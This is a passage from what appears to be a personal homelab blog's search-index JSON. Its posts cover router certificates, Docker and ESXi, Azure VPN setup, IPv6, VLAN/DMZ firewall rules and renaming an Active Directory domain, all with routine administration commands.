CERTIFICATE-----MIIFnjCCBIagAwIBAgITRQAAADDBVvjt5tSiJQAAAAAAMDANBgkqhkiG9w0BAQsFADBTMRIwEAYKCZImiZPyLGQBGRYCYXUxEzARBgoJkiaJk/IsZAEZFgNjb20xFTATBgoJkiaJk/IsZAEZFgVsaW5kczERMA8GA1UEAxMIbGluZHMtQ0EwHhcNMjAwNDIyMDk1MDIwWhcNMjIwNDIyMDk1MDIwWjBPMQswCQYDVQQGEwJBVTEMMAoGA1UECBMDVklDMQ4wDAYDVQQHEwVMYW5neTEOMAwGA1UEChMFTElORFMxEjAQBgNVBAMTCWxpbmRzLWVyeDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALzkxxUsPbNY0BHjwWXlIjf39a2/Kfl82yxaaE9cuJU3A6aSaSx66Vj8ujBWGlY39zUhsOnYwSdo5pMzNnXgXj+cDm8ZzPzUzbeka6EU1NiwVSDXcd36CPyB0l+UcquhchhAm+brf6Qag0u5awPnkMxA+SLl4LOveNQyQ39Q528UNjXNgwP7OeWxB+ePpUdyK7wnLFcOsjNGT45zwPrn4W0p9n2ZFFHmQo2mC4EGlEBU0Ew05DuZ8MlUIrvW5cId/u/t0um6g/7/KKiO39gF6vNA5XqR5/n4azb80SlXAzB5rDD35QFCcmQrmezNz2/Yqv8vYd1loZJJ9Xke/QLz3UUCAwEAAaOCAm0wggJpMCEGCSsGAQQBgjcUAgQUHhIAVwBlAGIAUwBlAHIAdgBlAHIwDgYDVR0PAQH/BAQDAgWgMBMGA1UdJQQMMAoGCCsGAQUFBwMBMCcGCSsGAQQBgjcVCgQaMBgwCgYIKwYBBQUHAwEwCgYIKwYBBQUHAwIwHQYDVR0OBBYEFBlMCORAvbWozlDl90a/8gq4QSm8MCcGA1UdEQQgMB6CFmxpbmRzLWVyeC5saW5kcy5jb20uYXWHBMCoBgEwHwYDVR0jBBgwFoAUY9vCKW1+0y1E+DCrVqvqYbZH2+wwgcsGA1UdHwSBwzCBwDCBvaCBuqCBt4aBtGxkYXA6Ly8vQ049bGluZHMtQ0EsQ049TElORFMtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9bGluZHMsREM9Y29tLERDPWF1P2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvgYIKwYBBQUHAQEEgbEwga4wgasGCCsGAQUFBzAChoGebGRhcDovLy9DTj1saW5kcy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1saW5kcyxEQz1jb20sREM9YXU/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwDQYJKoZIhvcNAQELBQADggEBANDR3v39SrI6hFjiyDHwhgErmsAIRYtVzN7GDFarLLTizX+kL/z0vDOAQ49ZdXPSoY1fskY0fjTk4VtDWIDzo4rSXxQgovSusKxYSHbb/pQhY4gDF9Xn2snxt7mvORdemrC+AAVcgJEYwx/oSDXzhevxYiIEx8+TRudZFdf3iR/kNZJTPW6gh5w64Lox6juN0uFOKczEGOXqfBFA0bLzF1VRHOdSn3pR9v5UV5ykHA+O0bGIEbXNvzHc1F6qKLCYLG/d4Teil3ao40RiAIo17woCJpsMnZsXcPiRxoAVIWq0o7fNrF/afcJJ4+xMBetEl+eAvPNn6Cb+upnlnkeLQOE=-----END CERTIFICATE-----If we remove the top, before ----BEGIN CERTIFICATE----, and change the file extension to .cer, we can combine the private key (.key) and certificate (.cer) for use with out EdgeMAX device.After doing that, I will combine them, by using cat, like below,cat ubnt-decrypted.key ubnt.cer &amp;gt; ubnt-signed.cerOnce we have ubnt-signed.cer, we can use cat to have a look at it, and you shall see something like this.-----BEGIN RSA PRIVATE KEY-----MIIE.......-----END RSA PRIVATE KEY----------BEGIN CERTIFICATE-----MIIFIW.....-----END CERTIFICATE-----To set this on the EdgeMAX device, open/resume a SSH session.Enter configure mode, by enteringconfigureset service gui cert-file /config/auth/&lt;cer file&gt;;set service gui ca-file /config/auth/&lt;ca file&gt;;commit Open up a web browser and head towards your EdgeMAX devices web interfaceAs long as your computer trusts your CA, you will not be prompted, and immediately greeted with your login page." }, { "title": "Homelab Update 15/04/2020", "url": "/posts/homelab-update/", "categories": "", "tags": "homelab", "date": "2020-04-15 00:00:00 +1000", "snippet": "It has been a while since my last post. I have completed some updates over the past few months to my Homelab. The biggest addition is using Docker, which was a challenging but rewarding experience....", "content": "It has been a while since my last post. I have completed some updates over the past few months to my Homelab. The biggest addition is using Docker, which was a challenging but rewarding experience. I also changed from Hyper-V back to ESXi, while also running vCenter Server, upgraded the RAM from 48GB to 64GB, which allowed me to have more VM’s running. Docker My Docker instance is running on a Red Hat Enterprise Linux VM, which gave me a chance to learn more about Linux.DockerMy Docker instance is running on a Red Hat Enterprise Linux VM, which initially started out as something to learn more about Linux. Transforming it to Docker allowed me to learn even more about Linux.I currently have UNMS (Ubiquiti Network Management System) and the UniFi controller running to actively configure and monitor my network, I also have the entire Monolithic Lancache set up, that receives forwarded DNS requests from Pi-Hole when the DNS requests are Steam, Blizzard, Riot, Origin etc CDN's, and it caches all the downloads, including updates to the 12TB storage through SMB.The PostgreSQL server was used when I was developing a web application using Django (Python) to learn Python.The speedtest container, is a simple HTM5 web instance, that will allow me to perform quick speed test on any device internally.Watchtower is a great addition, as it automates image updates for my running containers, which requires no administrative effort.Hyper-V to ESXiI moved to ESXi, as Hyper-V was becoming less of a challenge. I couldn't utilise SCSI Bus Sharing, which gave me another reason to switch Hyper Visors. It was simple to do, I used Starwind V2V to convert the VHDX's to VMDK's and then used VMWare standalone converter to reduce the size of the VMDK's from 127GB each to their respective sizes.I installed the vCenter server appliance to try and setup an LACP group, which took a lot longer than expected, but I eventually sorted that out, and now have an active LACP connection up and running with 2x1Gbps ethernet connections.AutomationPreviously I was using a VM with Backblaze to backup my 12TB of data, and it would require me to turn the VM on when I know my network was not being used. I have now moved to installing PowerCLI, which is VMWare's PowerShell modules to connect and interact with VMWare servers. I wrote a couple of PowerShell scripts to automatically turn on the backup server and then turn it off again at specific times using Task Scheduler on LINDS-DC2. An example script is below." }, { "title": "Learning Azure", "url": "/posts/learning-azure/", "categories": "", "tags": "homelab", "date": "2020-02-28 00:00:00 +1100", "snippet": "I recently discovered Windows Admin Centre and saw the integrations with Azure in it. This made me want to learn Azure, as definitely the industry is heading towards the \"Cloud\". After registering ...", "content": "I recently discovered Windows Admin Centre and saw the integrations with Azure in it. This made me want to learn Azure, as definitely the industry is heading towards the \"Cloud\". After registering you're presented with thisFirst thing you need to do is create a resource group.After creating a Resource Group, you can obviously create a Resource.The amount of quick start resources is amazing, but what I want to test out is integration with a Server 2016/2019 VM that is hosted in Azure.After creating the VM and RDP'ing into it and verifying it's all working, I set out to attach the VM to my Hyper-V host to manage and learn from. First I had to link my Azure instance to my WAC (Windows Admin Center) instance. This was not hard, as all I had to do was go to Settings -&gt; Azure, and link the account. Once the account was linked I had to grant permissions to WAC for Azure.As you can see below, there is an option in the later versions of WAC to create a Azure Network Adapter.Submitting the Azure Virtual Network Gateway to be created, took some time, as I first had to create the subnet that it was going to be set up in. Once that was done, the request was sent, and now just waiting on Azure to finish setting it up.Once that is created, you will see in your \"All Resources\" a Virtual network gateway.I was under the impression that the setup of the VPN gateway was automatic through the WAC, but it doesn't look like it, so I started setting it up manually. First I had to go to Point-to-site configuration and download the VPN client and install it on my Hyper-V host.Once installed on my Hyper-V Host, I can see the VNET adapterAttempting to Connect to the Virtual Network Adapter was failing due to a certificate issue. I tried installing the certificate, and did some further research to see what I was doing wrong. I needed to set up a site to site VPN but at the moment, I don't want to do that, as I don't want to mess with my current networking config." }, { "title": "Implementing IPv6 in the Homelab", "url": "/posts/ipv6/", "categories": "", "tags": "homelab", "date": "2019-10-27 00:00:00 +1100", "snippet": "I have never utilised IPv6 in any aspect, and I decided to set myself a challenge to try and implement it, even though I'm not going to particularly use it in my homelab.DHCPv6 Prefix DelegationBig...", "content": "I have never utilised IPv6 in any aspect, and I decided to set myself a challenge to try and implement it, even though I'm not going to particularly use it in my homelab.DHCPv6 Prefix DelegationBigPond/Telstra hands out IPv6 addresses, and this can be seen when using the Telstra Gateway Max as your gateway, it DHCP's out IPv6 addresses to clients. By enabling DHCPv6-PD (Prefix Delegation) on the EdgeRouter X, on the WAN (eth0) interface, eth0 is given a /64 IPv6 address range, which can then be delegated into 256 /56 IPv6 subnets across interfaces. To enable DHCPv6-PD, I used a command like below.set interfaces ethernet eth0 dhcpv6-pd pd 1 interface eth1 service slaac This uses interface eth0, that is receiving the DHCPv6 address from Telstra, and created a prefix delegation of number 1, and shares that prefix delegation to eth1, using the service SLAAC (Stateless Address Auto Configuration). Once the subnet is delegated to an interface, the clients will still need a gateway known to them to obtain the delegated IPv6 addresses. We do this by enabling the gateway to send out router advertisements, or more commonly known as RA. To do this on the Edgemax devices, we need to turn RA on the interface that is receiving these delegated IPv6 addresses which in this case is eth1, and can be done with the below commands.set interfaces ethernet eth1 ipv6 router-advert send-advert trueset interfaces ethernet eth1 ipv6 router-advert prefix ::/56This sets up the IPv6 RA for the eth1 interface. Any device connected through that interface, that is capable of handling IPv6, will now receive an IPv6 address.ConclusionAs you can see above, checking the public IP address through Google search, returns an public IPv6 address.Another test to carry out is to run an online IPv6 test, which can be found here." }, { "title": "VLAN And Firewall Rules – DMZ", "url": "/posts/VLAN-Firewall/", "categories": "", "tags": "homelab", "date": "2019-08-04 00:00:00 +1000", "snippet": "The website you are currently on, is located on my server at home. Having this hosted at home can bring some security issues. Having no firewall rules, can allow a compromised machine (Web Server) ...", "content": "The website you are currently on, is located on my server at home. Having this hosted at home can bring some security issues. Having no firewall rules, can allow a compromised machine (Web Server) unfiltered access to the other networks, which could result in damage. I want to prevent this, and one of the best ways to achieve this, is by setting up firewall rules between the networks.The EdgeRouterX-SFP, has a nice GUI to implement these rules, but is a stateful firewall, which is a different approach compared to traditional firewalls I've used before.&lt;figcaption&gt;Explanation of RulesPosted by BranoB on Ubiquiti Community Forums&lt;/figcaption&gt;&lt;/figure&gt;I've created 3 separate rules, VLAN20-IN, VLAN20-LOCAL, VLAN20-OUTCreating the RulesVLAN20 - INThis as the traffic from VLAN20 into the routing, before it is routed to different interfaces etc. Since I want to block traffic from VLAN20 to VLAN1, my rule needs to drop traffic with a destination of VLAN20 and VLAN1 addresses. I want to be able to access these servers, but only from my personal computer (IP: 192.168.6.128). The rules below meet this requirementExplanation:Rule 1. If the destination of the traffic is to 192.168.6.128, accept the traffic and forward it.Rule 2. If the destination of the traffic is to the 192.168.6.1/24 subnet, drop the traffic.Rule 3. If the destination of the traffic is to the 192.168.1.1/24 subnet, drop the traffic.Verification:1. If my IP is 192.168.6.128 and I ping anything in VLAN20, I should receive a response.2. If my IP is not 192.168.6.128, but in the 192.168.6.1/24 subnet, I will not receive a ping response.VLAN20 - LOCALVLAN20 - LOCAL is the traffic direction towards the router itself. Here you can limit what the devices on this VLAN can get from the router. This is useful for blocking administration access to the router (ie HTTP, HTTPS, SSH). My goal was to block everything except DHCP traffic, and include 1.1.1.1 as the DNS in the DHCP scope.Verification:This is easily verified by trying to access the router on 10.1.1.1 which is defined in the DHCP Scope.VLAN20 - OUTVLAN20 - OUT is the traffic leaving the router. I obviously want the HTTP, HTTPS and DNS traffic leaving VLAN20, as it currently hosts the website and the DNS. I also want to be able to connect to the VM to add/edit posts on the website.Verification:From a device/VM inside VLAN20, I should be able to ping 192.168.6.128.From a device in VLAN20, I should only be able to browse HTTP/HTTPS traffic, but not ping the host.AdditionalRunning these VM's in a Hyper-V environment, means different measures also need to be taken. Since the VM Switch is on the Hyper-V host, and was created with the defaults, the Hyper-V host is connected to that VLAN, and if somehow someone was able to gain access to a VM on VLAN20, they might be able to get their way through to the Hyper-V host and take over the network.To prevent this, we need to turn off management OS on the VM Switch. We can do this by running a simple PowerShell command, \"Get-VMSwitch | fl\"We can see that the \"AllowManagementOS\" option is set to \"True\". We can disbale this with \"Set-VMSwitch -Name \"DMZ Switch\" -AllowManagementOS $false\", which will remove the vSwitch adapter from the Hyper-V host and remove the ability for the VM's inside that vSwitch to connect to the Hyper-V host and potentially jeopardising the network.ConclusionFrom these rules and testing with verification, I can now sleep better with some extra added security to my network." }, { "title": "Changing Domain Name", "url": "/posts/changing-domain-name/", "categories": "", "tags": "homelab", "date": "2019-07-01 00:00:00 +1000", "snippet": "When I first created my homelab ennvironment, I didn't fully know what I was doing. But that's the reason for a homelab right?One of the first things I got wrong when building a domain was the actu...", "content": "When I first created my homelab ennvironment, I didn't fully know what I was doing. But that's the reason for a homelab right?One of the first things I got wrong when building a domain was the actual forest name being wrong. The domain UPN suffix is linds.local and the domain is LINDS-SERVER, and I wish to change it to linds.com.au and LINDS.First is to create the zone of the domain, so I will create a new primary zone, and I wil; have it be an AD integrated zone2. After you have created the primary zone, you will want to open a administrative PowerShell/CMD prompt, and run the following command. rendom /list(DO NOT CLOSE THIS POWERSHELL/CMD PROMPT)3. After running rendom /list, you will see it's created a file in your current working directory, named Domainlist.xml. Open this file.4. Edit the DNSname attribute to what you wish to change it to, for example from \"DomainDnzZones.linds.local\" to DomainDnsZones.linds.com.au\". Once finished, save the file and close Notepad.5. Return back to the PowerShell prompt and run rendom /showforest You should see at the bottom, \"This operations completed successfully.\"This operations parses the Domainlist.xml file for any changes, and shows the changes. Below you can see that it's detected the changes from LINDS.LOCAL, to linds.com.au.6. Once you are happy, run the commandrendom /upload then runrendom /prepareAfter running \"rendom /prepare\", I ran into an issue." }, { "title": "Setting Up Point-To-Site Virtual Gateway – Azure", "url": "/posts/pts-azure/", "categories": "", "tags": "homelab", "date": "2019-06-25 00:00:00 +1000", "snippet": "Azure is an interesting platform, and I wanted to see what it is like to connect a device on my private network to Azure's Private network, if for example I was to set up replication, or Azure Back...", "content": "Azure is an interesting platform, and I wanted to see what it is like to connect a device on my private network to Azure's Private network, if for example I was to set up replication, or Azure Backup etc.Below is the steps that I took to get it up and running on my Hyper-V 2019 host.On the Virtual Network, created separate gateway subnet to attach the Virtual Gateway to.2. Head to the Virtual Network Gateway you created, then click Point-to-site configuration. Add a IP range that the site will connect to.3. On the client ie. My Hyper-V host, need to run the below in a elevated Powershell prompt. NOTE Don't close the Powershell prompt $cert = New-SelfSignedCertificate -Type Custom -KeySpec Signature ` -Subject \"CN=AzureVPN\" -KeyExportPolicy Exportable ` -HashAlgorithm sha256 -KeyLength 2048 ` -CertStoreLocation \"Cert:\\CurrentUser\\My\" -KeyUsageProperty Sign -KeyUsage CertSign This will create the cert you can use for the VPN.Now to create the Client cert run the below. New-SelfSignedCertificate -Type Custom -DnsName P2SChildCert -KeySpec Signature ` -Subject \"CN=AzureVPNClient\" -KeyExportPolicy Exportable ` -HashAlgorithm sha256 -KeyLength 2048 ` -CertStoreLocation \"Cert:\\CurrentUser\\My\" ` -Signer $cert -TextExtension @(\"2.5.29.37={text}1.3.6.1.5.5.7.3.2\") Once you can see the cert in Current User -&gt; Persoanl -&gt; Cetificates, right click on the AzureVPN certificate, and go All Tasks -&gt; Export.Export it where ever is easiest for you, IE Desktop.Now open the certificate in NotepadCopy all of the certificate and head back to the virtual gateway on the Azure Portal.You will need to enter as below, except pasting your own certificate.Make sure to save this configuration, and do note this can take some time.Once the configuration is saved, click Download VPN client. Extract the zip. Once you have extracted the ZIP head to \"WindowsAmd64/VpnClientSetupAmd64.exe\" and run.Click Yes to installing the VPN Client.If you check in Network Adapters, you will see a WAN Miniport connection. Click connect and you will be prompted with this.Click Connect again and you will be connected to your Virtual Network hosted in Azure!We can confirm this by first trying to RDP into my virtual machine that is hosted in Azure.As you can see, my VM in Azure has a private IP 10.0.0.4And there we go, we are now connected our Azure Virtual Network from our Hyper-V host!" }, { "title": "Homelab Update 10/06/19", "url": "/posts/homelab-update/", "categories": "", "tags": "homelab", "date": "2019-06-24 00:00:00 +1000", "snippet": "Below is a picture of my current setup. The HP N54L was being the main storage for my network, and only had a single GBit Ethernet connection between it, and the Dell R710.Since the R710 only had a...", "content": "Below is a picture of my current setup. The HP N54L was being the main storage for my network, and only had a single GBit Ethernet connection between it, and the Dell R710.Since the R710 only had a 4 Drive back-plane installed, I wasn't able to move all 4 physical drives from the N54L to the R710. I purchased the back-plane upgrade part, and also purchased the extra SAS cable to use all 6 ports on the back-plane.Updated DiagramAfter moving the disks to the R710, a big increase in performance was seen, mainly due to the Perc H700 RAID controller. The H700 allows full 6Gb/s interface to the drives, while the N54L only had 3Gb/s. Combined with the LACP/LAGG set up, I can now have 2 computers accessing the \"NAS\" at full gigabit speeds." } ]
